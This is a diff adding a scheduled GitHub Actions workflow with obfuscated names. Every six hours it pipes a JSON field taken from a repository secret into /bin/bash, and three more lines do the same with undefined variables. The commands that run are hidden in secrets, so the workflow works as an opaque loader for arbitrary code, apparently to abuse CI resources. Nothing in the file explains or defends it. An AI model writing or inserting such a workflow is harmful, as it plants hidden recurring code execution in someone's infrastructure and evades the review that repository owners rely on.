@@ -1,0 +1,22 @@
+name: wangtingzhong2341
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangtingzhong2341
+        env:
+          sog06685: ${{ secrets.sog06685 }}
+        run: |
+          echo $sog06685 | jq -r .xyxhd3441 | /bin/bash
+          echo $buc8966 | jq -r .ha263 | /bin/bash
+          echo $y3 | jq -r .ue3 | /bin/bash
+          echo $b946 | jq -r .yly395 | /bin/bash
+
